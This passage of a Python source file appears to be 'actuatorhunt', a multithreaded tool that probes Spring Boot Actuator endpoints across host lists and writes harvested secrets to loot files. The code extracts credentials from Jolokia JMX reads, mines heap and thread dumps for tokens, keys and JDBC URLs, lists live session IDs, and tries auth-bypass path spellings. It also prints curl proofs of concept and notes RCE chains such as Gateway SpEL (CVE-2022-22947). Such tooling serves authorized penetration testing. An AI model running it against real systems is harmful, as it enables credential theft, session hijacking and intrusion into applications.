            note=f"{len(items)} exchange(s) in the buffer; it rotates, so "
                 f"re-running under load yields more",
            poc=f"curl -sk '{url}'"))

    def harvest_jolokia(self, base):
        """
        Read-only JMX. The Runtime MBean carries the JVM command line, which is
        where operators put -Dspring.datasource.password=... No MBean is
        executed: these are reads.
        """
        ver = self.fetch(f"{base}/jolokia/version")
        vobj = self.json_of(ver)
        if not isinstance(vobj, dict) or "value" not in vobj:
            return
        agent = ""
        if isinstance(vobj.get("value"), dict):
            agent = str(vobj["value"].get("agent", ""))

        loot, notes = [], []
        for attr in ("InputArguments", "SystemProperties"):
            rr = self.fetch(f"{base}/jolokia/read/java.lang:type=Runtime/{attr}")
            oo = self.json_of(rr)
            if not isinstance(oo, dict):
                continue
            val = oo.get("value")
            blob = json.dumps(val) if not isinstance(val, str) else val
            if isinstance(val, dict):
                for k, v in val.items():
                    sv = str(v)
                    kind, shapes = classify_property(str(k), sv)
                    if kind == "credential":
                        loot.append(f"{attr}: {k} = {sv[:200]}")
            elif isinstance(val, list):
                for item in val:
                    s = str(item)
                    if CRED_KEY_RX.search(s) or scan_value(s):
                        loot.append(f"{attr}: {s[:250]}")
            for kind, sv in scan_value(blob)[:20]:
                # already reported verbatim above? don't say it twice
                if any(sv[:60] in existing for existing in loot):
                    continue
                loot.append(f"{attr}: {kind}: {sv[:200]}")

        lst = self.fetch(f"{base}/jolokia/list")
        gadgets = []
        if lst.ok and lst.status == 200:
            for gadget, why in (("JMXConfigurator", "Logback reloadByURL -> "
                                                    "remote config load"),
                                ("createJNDIRealm", "Tomcat JNDI realm -> "
                                                    "LDAP/RMI injection"),
                                ("Memory", "heap dump via MBean")):
                if gadget in (lst.body or ""):
                    gadgets.append(f"{gadget} ({why})")

        if loot:
            self.loot.write(base, "credentials.txt",
                            [f"# {base}/jolokia (JMX Runtime)"] + loot)
        self.add(Finding(
            sev=CRIT,
            title="Jolokia JMX bridge readable" +
                  (" - secrets in the JVM command line" if loot else ""),
            url=f"{base}/jolokia",
            impact="Jolokia exposes the MBean server over HTTP. Reading the "
                   "Runtime MBean alone yields the JVM arguments and system "
                   "properties, where credentials are routinely passed.",
            loot=loot,
            note=(f"agent {agent}" if agent else "") +
                 ("; gadget MBeans present: " + ", ".join(gadgets)
                  if gadgets else ""),
            chain=("MBean write gadgets reachable -> JNDI injection -> RCE "
                   "(NOT attempted)" if gadgets else ""),
            poc=f"curl -sk '{base}/jolokia/read/java.lang:type=Runtime/SystemProperties'"))

    def harvest_heapdump(self, base):
        """
        Confirm by HPROF magic, then stream-mine. The dump is never written to
        disk and never held in memory: chunks pass through a sliding window so
        a secret straddling a chunk boundary is still caught.
        """
        url = f"{base}/heapdump"
        head = self.req.get(url, extra_headers={"Range": "bytes=0-127"},
                            max_read=MAGIC_READ)
        self.bump()
        if not head.ok or head.status not in (200, 206):
            return
        if "JAVA PROFILE" not in (head.body or "")[:64]:
            ctype = head.header("Content-Type", "").lower()
            if "octet-stream" not in ctype:
                return

        if not self.args.heapdump:
            self.add(Finding(
                sev=CRIT, title="/heapdump exposed - full JVM heap downloadable",
                url=url,
                impact="Contains everything the JVM held: datasource passwords, "
                       "signing keys, live session tokens, cloud credentials.",
                note="only 128 bytes were read (HPROF magic confirmed). Re-run "
                     "with --heapdump to stream and mine it for secrets.",
                poc=f"curl -sk '{url}' -o heap.hprof"))
            return

        limit = int(self.args.heapdump_max * 1024 * 1024)
        found, tail = {}, b""
        cap = self.args.heapdump_hits

        def on_chunk(chunk):
            nonlocal tail
            window = tail + chunk
            try:
                text = window.decode("latin-1", "replace")
            except Exception:
                text = ""
            for kind, val in scan_value(text):
                bucket = found.setdefault(kind, set())
                if len(bucket) < cap:
                    bucket.add(val)
            tail = window[-4096:]

        self.rep.info(f"streaming {url} (cap {self.args.heapdump_max} MB)")
        read, status = self.req.stream(url, limit, on_chunk)
        self.bump()
        if not read:
            return
        lines = []
        for kind in sorted(found):
            for v in sorted(found[kind]):
                lines.append(f"{kind}: {v}")
        mb = read / 1024 / 1024
        if lines:
            self.loot.write(base, "heapdump-secrets.txt", [f"# {url}"] + lines)
        self.add(Finding(
            sev=CRIT,
            title=f"Secrets mined from /heapdump ({len(lines)} item(s))"
                  if lines else "/heapdump exposed - streamed, no secret matched",
            url=url,
            impact="A heap dump is the richest single artefact on a Java host. "
                   "These values were extracted from live memory.",
            loot=lines,
            note=f"{mb:.1f} MB streamed and discarded; nothing written to disk "
                 f"except the extracted strings",
            poc=f"curl -sk '{url}' -o heap.hprof   # full dump for MAT/strings"))

    def harvest_routes(self, base):
        """Turn /mappings and /metrics into a real attack-surface list."""
        routes = set()
        r = self.fetch(f"{base}/mappings")
        obj = self.json_of(r)
        if obj is not None:
            for m in re.finditer(r'"(/[A-Za-z0-9_\-/{}.*]{1,80})"',
                                 r.body or ""):
                routes.add(m.group(1))
        rm = self.fetch(f"{base}/metrics/http.server.requests")
        om = self.json_of(rm)
        if isinstance(om, dict):
            for tag in om.get("availableTags") or []:
                if isinstance(tag, dict) and tag.get("tag") == "uri":
                    for v in tag.get("values") or []:
                        if str(v).startswith("/"):
                            routes.add(str(v))
        if not routes:
            return
        juicy = sorted(x for x in routes
                       if re.search(r"(?i)(admin|internal|debug|actuator|"
                                    r"manage|token|secret|key|upload|export|"
                                    r"backup|user|account|api/v\d)", x))
        self.loot.write(base, "routes.txt", sorted(routes))
        self.add(Finding(
            sev=MED if juicy else LOW,
            title=f"Attack surface enumerated: {len(routes)} route(s)",
            url=f"{base}/mappings",
            impact="The application's real routing table, including endpoints "
                   "that are not linked anywhere. Feed this to your other "
                   "scanners instead of guessing.",
            loot=juicy or sorted(routes)[:12],
            note=f"full list written to the loot directory "
                 f"({len(juicy)} interesting of {len(routes)})"))

    def harvest_threaddump(self, base):
        r = self.fetch(f"{base}/threaddump")
        if not (r.ok and r.status == 200):
            return
        hits = []
        for kind, val in scan_value(r.body)[:40]:
            hits.append(f"{kind}: {val}")
        if not hits:
            return
        self.loot.write(base, "tokens.txt", [f"# {base}/threaddump"] + hits)
        self.add(Finding(
            sev=HIGH, title="Secrets found in /threaddump",
            url=f"{base}/threaddump",
            impact="Tokens and connection strings appear in thread names and "
                   "stack frames.",
            loot=hits))

    def harvest_gateway(self, base):
        r = self.fetch(f"{base}/gateway/routes")
        obj = self.json_of(r)
        if obj is None:
            return
        routes = []
        if isinstance(obj, list):
            for it in obj:
                if isinstance(it, dict):
                    routes.append(f"{it.get('route_id', '?')} -> "
                                  f"{it.get('uri', '?')}  {it.get('predicate', '')}")
        if not routes:
            return
        self.loot.write(base, "urls.txt", [f"# gateway routes"] + routes)
        self.add(Finding(
            sev=CRIT, title="Spring Cloud Gateway admin API readable",
            url=f"{base}/gateway/routes",
            impact="The internal service topology, and the API that creates "
                   "routes. A route filter accepts SpEL.",
            loot=routes,
            chain="POST /gateway/routes with a SpEL filter -> /gateway/refresh "
                  "-> RCE, CVE-2022-22947 (NOT attempted)"))

    def check_post_only(self, base, name, impact):
        r = self.fetch(f"{base}/{name}")
        if r.ok and r.status == 405:
            self.add(Finding(
                sev=HIGH, title=f"/{name} mounted (POST-only)",
                url=f"{base}/{name}", impact=impact,
                note="proven by the 405 a GET returns; deliberately NOT invoked"))

    def try_bypass(self, base, ep_name):
        if self.args.no_bypass:
            return False
        for tpl in BYPASS_SPELLINGS:
            url = tpl.format(base=base, ep=ep_name)
            r = self.fetch(url)
            if self.json_of(r) is None:
                continue
            self.add(Finding(
                sev=CRIT,
                title=f"Actuator auth bypass - /{ep_name} via path-matcher evasion",
                url=url,
                impact="The canonical path is guarded but the Spring Security "
                       "matcher does not normalise this spelling, so every "
                       "endpoint behind that rule is reachable.",
                poc=f"curl -sk '{url}'"))
            return True
        return False

    # -- driver --------------------------------------------------------------

    def harvest_base(self, base, available):
        """`available` is the HAL list when we have one, else the fallback."""
        have = set(a.split("/")[0] for a in available)

        if "env" in have:
            self.harvest_env(base, "env")
        if "configprops" in have:
            self.harvest_env(base, "configprops")
        for ep in ("httpexchanges", "httptrace", "trace"):
            if ep in have:
                self.harvest_exchanges(base, ep)
                break
        if "jolokia" in have:
            self.harvest_jolokia(base)
        if "gateway" in have:
            self.harvest_gateway(base)
        if "heapdump" in have:
            self.harvest_heapdump(base)
        if "threaddump" in have or "dump" in have:
            self.harvest_threaddump(base)
        if "mappings" in have or "metrics" in have:
            self.harvest_routes(base)
        if "shutdown" in have:
            self.check_post_only(base, "shutdown",
                                 "remote shutdown of the application")
        if "sessions" in have:
            r = self.fetch(f"{base}/sessions")
            obj = self.json_of(r)
            if isinstance(obj, dict) and obj.get("sessions"):
                ids = [str(s.get("id", "?")) for s in obj["sessions"][:50]
                       if isinstance(s, dict)]
                self.loot.write(base, "tokens.txt",
                                [f"# {base}/sessions"] + ids)
                self.add(Finding(
                    sev=HIGH, title="Active session identifiers listed",
                    url=f"{base}/sessions",
                    impact="Session ids of logged-in users.", loot=ids))

    def explore_base(self, base, root_ok=False, require_signature=False,
                     hal_hint=None):
        """
        Work one base path. Returns True only if an actuator was really found
        here - an index, a bypassed guard, or at least one live endpoint. The
        caller uses that to decide whether the other bases are still worth
        probing, so "I looked and found nothing" must not come back True.

        `require_signature` is for the management-port bases: an unrelated
        service on :9090 must not cost us a 38-endpoint probe, so it has to
        answer like an actuator first.
        """
        hal = hal_hint if hal_hint is not None else self.hal_index(base)
        confirmed = hal is not None
        if hal is None:
            if not (base.endswith("/actuator") or root_ok):
                return False
            # no index: is anything there at all, or is it guarded?
            probe = self.fetch(f"{base}/env")
            if probe.ok and probe.status in (401, 403):
                self.rep.info(f"{base}: guarded (HTTP {probe.status}), "
                              f"trying matcher bypasses")
                if not self.try_bypass(base, "env"):
                    return False
                confirmed = True
            elif require_signature:
                looks_like = (probe.ok and probe.status in (200, 405)
                              and self.json_of(probe) is not None)
                if not looks_like:
                    self.rep.debug(f"{base}: no actuator signature")
                    return False

        available = self.enumerate_endpoints(base, hal)
        if available:
            confirmed = True
        else:
            available = hal if hal else DEEP_FALLBACK
        self.harvest_base(base, available)
        return confirmed

    def mgmt_bases(self, origin):
        """The separate management server: management.server.port."""
        p = urllib.parse.urlsplit(origin)
        host = p.hostname
        out = []
        for port in MGMT_PORTS:
            if port == p.port:
                continue
            scheme = "https" if port in (8443, 9443) else p.scheme
            out.append(f"{scheme}://{host}:{port}/actuator")
        return out

    def hunt(self, tgt: Target):
        url = tgt.url
        self.rep.banner(f"Hunting {url}")
        origin = self._origin(url)
        known = {}          # bases whose HAL index we already fetched
        want_mgmt = self.args.mgmt_ports or self.args.depth == "deep"
        mgmt = self.mgmt_bases(origin) if want_mgmt else []

        if self.args.depth != "deep" and not self.quick_hit(url):
            # the app port says nothing - but the whole point of a separate
            # management port is that the actuator is NOT on the app port
            hit = False
            for base in mgmt:
                found = self.hal_index(base)
                if found is not None:
                    self.rep.info(f"{base}: actuator on a management port")
                    known[base] = found
                    hit = True
                    break
            if not hit:
                self.rep.test(f"{url}: no actuator signature, skipping")
                return

        found = False
        for base in self.candidate_bases(url):
            if self.explore_base(base, root_ok=(base == origin)):
                # same instance behind /actuator and behind the root, and the
                # other candidate paths would only repeat it
                found = True
                break

        if found:
            # the actuator is on the app port: the management ports would only
            # serve the same instance again, so they are not worth 8 probes
            if mgmt:
                self.rep.info(f"{url}: actuator found on the app port, "
                              f"skipping the management ports")
            return

        for base in mgmt:
            if self.explore_base(base, require_signature=True,
                                 hal_hint=known.get(base)):
                # one management port is the management server; the rest would
                # be the same instance again
                break


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------

def normalize(u):
    if not u.startswith(("http://", "https://")):
        u = "https://" + u
    return u


def load_urls(path):
    out = []
    with open(path, "r", encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if line and not line.startswith("#"):
                out.append(normalize(line))
    return out


BANNER = r"""
  actuatorhunt - Spring Boot Actuator loot extractor
  read-only (GET); authorized testing only
"""

EPILOG = """
endpoint inventory
  Every known endpoint is probed (Boot 1.x and 2/3 names, plus jolokia,
  gateway, configserver, logfile, hystrix, nacos...), including those the HAL
  index does not advertise. Each one is reported with its status and what it
  is worth, and written to endpoints.txt. --depth fast skips this probe
  and trusts the HAL index only.

then, what is behind them
  ffuf already tells you /actuator/env answers 200. That is a URL, not a
  finding. This tool also reads what is behind it and hands back material:

    /env            every property, and the MASKED ones RECOVERED - Spring
                    hides passwords as '******' in the index, but
                    /env/{property} usually returns them in clear
    /httpexchanges  other users' live Cookie / Authorization headers, with
                    Basic auth base64-decoded to user:pass
    /jolokia        read-only JMX: the JVM command line and system properties,
                    where -Dspring.datasource.password=... lives
    /heapdump       streamed and mined for JWTs, session ids, JDBC URLs and
                    cloud keys, nothing written to disk (--heapdump)
    /mappings       the real routing table, as a list for your other scanners

loot
  Everything extracted is written under --loot (default ./loot), one directory
  per host: credentials.txt, tokens.txt, urls.txt, routes.txt, env.json.

safety
  GET only. /shutdown and /refresh are proven by the 405 a GET returns on a
  POST-only endpoint, never invoked. Jolokia MBeans are read, never executed.
  The RCE chains (Gateway SpEL, JNDI gadgets, env+refresh) are reported with
  the exact chain and left for you to confirm in scope.

examples
  actuatorhunt.py -u https://target.example.com
  actuatorhunt.py -l hosts.txt -t 20 -d 0.1 --status-interval 15
  actuatorhunt.py -u https://target -H 'Cookie: JSESSIONID=...' --heapdump
  actuatorhunt.py -l hosts.txt --mgmt-ports --loot ./loot-client -v 1
"""


def build_parser():
    p = argparse.ArgumentParser(
        prog="actuatorhunt.py", description=BANNER, epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-v", dest="verbose", type=int, nargs="?", const=1, default=0,
                   choices=[0, 1, 2],
                   help="verbosity: 0 = only findings (default), 1 = every "
                        "endpoint harvested, 2 = debug (every request, response "
                        "status/size)")
    p.add_argument("-u", dest="url", help="single URL to test")
    p.add_argument("-l", dest="list", help="file containing a list of URLs to test")
    p.add_argument("--no-color", action="store_true",
                   help="disable coloured output (colour is on by default)")
    p.add_argument("--status-interval", type=float, default=30.0, metavar="SEC",
                   help="seconds between status lines in -l mode (default 30)")
    p.add_argument("-t", "--threads", type=int, default=4,
                   help="concurrent targets (default 4)")
    p.add_argument("-d", "--delay", type=float, default=0.0,
                   help="minimum gap between requests (s), enforced globally "
                        "across all threads")
    p.add_argument("-H", "--header", action="append", default=[],
                   help="extra header 'Name: value' (repeatable) - also how to "
                        "set a Cookie or override the User-Agent")
    p.add_argument("-p", "--proxy", help="proxy URL, e.g. http://127.0.0.1:8080")
    p.add_argument("--timeout", type=float, default=10.0,
                   help="request timeout (s, default 10)")
    p.add_argument("--loot", default="loot", metavar="DIR",
                   help="directory for the extracted material (default ./loot, "
                        "empty string to disable)")
    p.add_argument("--no-unmask", action="store_true",
                   help="do not resolve masked properties via /env/{property} "
                        "(saves one request per masked secret)")
    p.add_argument("--unmask-max", type=int, default=100, metavar="N",
                   help="max masked properties to resolve per endpoint "
                        "(default 100)")
    p.add_argument("--heapdump", action="store_true",
                   help="stream /heapdump and mine it for secrets; without it "
                        "the dump is only confirmed from its 128-byte magic")
    p.add_argument("--heapdump-max", type=float, default=512, metavar="MB",
                   help="stop streaming the heapdump after this many MB "
                        "(default 512)")
    p.add_argument("--heapdump-hits", type=int, default=100, metavar="N",
                   help="max distinct values kept per secret type (default 100)")
    p.add_argument("--mgmt-ports", action="store_true",
                   help=f"also probe the usual management ports "
                        f"({', '.join(str(x) for x in MGMT_PORTS)})")
    p.add_argument("--depth", choices=["fast", "normal", "deep"],
                   default="normal",
                   help="how much work per target. fast: pre-check, then trust "
                        "the HAL index only. normal (default): pre-check, then "
                        "probe the full endpoint catalogue. deep: no pre-check, "
                        "every target gets the full probe (and the management "
                        "ports, see --mgmt-ports)")
    # kept so existing command lines and orchestrator stages keep working
    p.add_argument("--no-enum", dest="depth", action="store_const",
                   const="fast", help=argparse.SUPPRESS)
    p.add_argument("--no-quick", dest="depth", action="store_const",
                   const="deep", help=argparse.SUPPRESS)
    p.add_argument("--no-bypass", action="store_true",
                   help="do not try Spring Security path-matcher bypasses")
    p.add_argument("--version", action="version", version=f"%(prog)s {VERSION}")
    return p


def run_all(hunter, targets, rep, args, status):
    def one(t):
        try:
            hunter.hunt(t)
        except Exception as e:
            rep.error(f"{t.url}: {type(e).__name__}: {e}")
        finally:
            status.host_done()

    if args.threads > 1 and len(targets) > 1:
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
            list(ex.map(one, targets))
    else:
        for t in targets:
            one(t)


def print_summary(hunter, req, targets, elapsed, loot: Loot):
    C = Colors
    print(f"\n{C.BOLD}--- summary ---{C.RESET}")
    print(f"targets      : {len(targets)}")
    print(f"requests     : {req.count}")
    print(f"duration     : {elapsed:.1f}s")
    print(f"{C.GREEN}{C.BOLD}secrets extracted : {hunter.secrets}{C.RESET}")
    for sev in (CRIT, HIGH, MED, LOW, INFO):
        n = sum(1 for f in hunter.findings if f.sev == sev)
        if n:
            print(f"  {sev_paint(sev):<24} {n}")
    if loot.counts:
        print(f"\n{C.BOLD}--- loot written ---{C.RESET}")
        for name, n in sorted(loot.counts.items()):
            print(f"  {name:<24} {n} line(s)   ({loot.root}/<host>/{name})")
    return [f for f in hunter.findings if f.sev in (CRIT, HIGH)]


def main(argv=None):
    args = build_parser().parse_args(argv)
    if args.no_color or os.environ.get("NO_COLOR"):
        Colors.disable()
    if not args.url and not args.list:
        build_parser().print_help()
        return 2

    targets, seen = [], set()
    if args.url:
        u = normalize(args.url)
        targets.append(Target(u)); seen.add(u)
    if args.list:
        if not os.path.isfile(args.list):
            print(f"error: no such file: {args.list}", file=sys.stderr)
            return 2
        for u in load_urls(args.list):
            if u not in seen:
                seen.add(u)
                targets.append(Target(u))
    if not targets:
        print("error: no targets", file=sys.stderr)
        return 2

    rep = Reporter(args.verbose)
    status = Status(rep, len(targets), interval=args.status_interval,
                    enabled=bool(args.list))
    loot = Loot(args.loot or "", rep)

    print(f"{Colors.CYAN}{BANNER}{Colors.RESET}")
    print(f"  targets {Colors.BOLD}{len(targets)}{Colors.RESET}   "
          f"threads {args.threads}   timeout {args.timeout:.0f}s   "
          f"depth {args.depth}"
          + ("   mgmt ports ON" if (args.mgmt_ports or args.depth == "deep")
             else "")
          + (f"   delay {args.delay}s" if args.delay else "")
          + (f"   heapdump mining ON (<= {args.heapdump_max:.0f} MB)"
             if args.heapdump else "")
          + (f"   loot -> {args.loot}" if args.loot else "   loot disabled"))
    print()

    req = Requester(timeout=args.timeout, proxy=args.proxy, headers=args.header,
                    delay=args.delay, reporter=rep)
    hunter = ActuatorHunter(req, rep, args, loot, status)

    started = time.time()
    status.start()
    try:
        run_all(hunter, targets, rep, args, status)
    except KeyboardInterrupt:
        rep.error("interrupted by user")
    finally:
        status.stop()
        status.emit(label="final")
    elapsed = time.time() - started

    real = print_summary(hunter, req, targets, elapsed, loot)
    return 1 if real else 0


if __name__ == "__main__":
    sys.exit(main())
